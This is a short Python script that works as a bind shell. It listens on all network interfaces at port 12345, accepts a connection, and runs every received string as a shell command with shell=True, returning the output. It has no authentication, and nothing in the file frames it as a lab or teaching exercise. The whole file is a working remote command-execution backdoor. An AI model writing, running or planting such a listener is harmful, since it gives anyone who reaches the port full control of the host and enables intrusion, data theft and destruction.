import socket
import subprocess

def start_server(host, port):
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the host and port
    server_socket.bind((host, port))

    # Listen for incoming connections
    server_socket.listen(1)
    print("[*] Listening for incoming connections on {}:{}".format(host, port))

    # Accept a connection from the client
    client_socket, client_address = server_socket.accept()
    print("[+] Connection established with {}:{}".format(client_address[0], client_address[1]))

    # Enter command loop to receive and execute commands from the client
    while True:
        # Receive command from the client
        command = client_socket.recv(1024)
        command=str(command, 'utf-8')

        # Execute the command and retrieve the output
        if command.lower() == "exit":
            break  # Break out of the loop if 'exit' command is received
        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                output = str(e).encode()

            # Send the output back to the client
            client_socket.send(output)

    # Close the connection
    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    HOST = '0.0.0.0'  # Listen on all available interfaces
    PORT = 12345      # Choose any available port

    start_server(HOST, PORT)

